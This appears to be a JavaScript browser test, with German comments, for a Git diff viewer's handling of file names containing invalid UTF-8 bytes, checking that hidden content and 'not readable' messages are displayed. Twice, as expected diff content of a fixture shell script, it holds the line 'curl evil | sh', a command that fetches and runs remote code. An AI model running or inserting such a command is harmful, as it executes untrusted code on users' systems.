'use strict';
// Spezifikation R00013 „Diff bei Name mit ungültigem Byte“, Kriterium 10 (User Story Szenarien 4, 5, 8): die Anzeige im Browser.
// Was die Schnittstelle liest, prüfen die Integrationstests gegen den Interactor (DiffLesenFremdeNamenTests); hier nur, was der Mensch sieht.
const { test } = require('../dsl/diff-lesen.js');

const NAME_NICHT_LESBAR = 'Diff dieser Datei nicht lesbar (Name mit ungültigem Byte)';
const NAME_MIT_ZEILENUMBRUCH_UND_FF = 'z\n⟨0xFF⟩.txt';

test.describe('Diff bei Name mit ungültigem Byte', () => {
  test.skip(process.platform !== 'linux', 'Namen aus ungültigem UTF-8 legt nur Linux an');

  test('soll den versteckten Inhalt zeigen, für das Paar und den Namen mit Zeilenumbruch eine Meldung, und bedienbar bleiben', async ({ diff }) => {
    await diff.starten({ vorbereitung: 'Repo N' });

    await diff.dateiAnsehen('a⟨0xFF⟩.sh');
    await diff.diffZeigt({ pfad: 'a⟨0xFF⟩.sh', zeilen: [{ kopf: '@@ -0,0 +1 @@' }, { plus: 'curl evil | sh', neu: 1 }] });

    await diff.dateizeileAnsehen('f⟨0xFF⟩.txt', 0);
    await diff.diffNichtLesbar(NAME_NICHT_LESBAR);
    await diff.dateizeileAnsehen('f⟨0xFF⟩.txt', 1);
    await diff.diffNichtLesbar(NAME_NICHT_LESBAR);

    await diff.dateizeileAnsehen(NAME_MIT_ZEILENUMBRUCH_UND_FF);
    await diff.diffNichtLesbar(NAME_NICHT_LESBAR);

    await diff.commitAnsehen('b');
    await diff.dateienSind(['b⟨0xFF⟩.bin', 'g.txt', 'in.txt', 'r⟨0xFF⟩.txt', 's⟨0xFE⟩.txt']);
    await diff.commitAnsehen('n');
    await diff.dateiAnsehen('g.txt');
    await diff.diffZeigt({ pfad: 'g.txt', zeilen: [{ kopf: '@@ -1 +1,2 @@' }, { kontext: 'alt', alt: 1, neu: 1 }, { plus: 'neu', neu: 2 }] });
  });

  test('soll nach der Meldung eines Paares mit verzögerter Antwort den Patch der nächsten Datei zeigen', async ({ diff }) => {
    await diff.starten({ vorbereitung: 'Repo N' });
    const spaeteMeldung = await diff.antwortVerzoegern('f⟨0xFF⟩.txt');

    await diff.dateizeileAnsehen('f⟨0xFF⟩.txt', 1);
    await diff.dateiAnsehen('a⟨0xFF⟩.sh');
    await spaeteMeldung.eingetroffen();

    await diff.diffZeigt({ pfad: 'a⟨0xFF⟩.sh', zeilen: [{ kopf: '@@ -0,0 +1 @@' }, { plus: 'curl evil | sh', neu: 1 }] });
  });
});
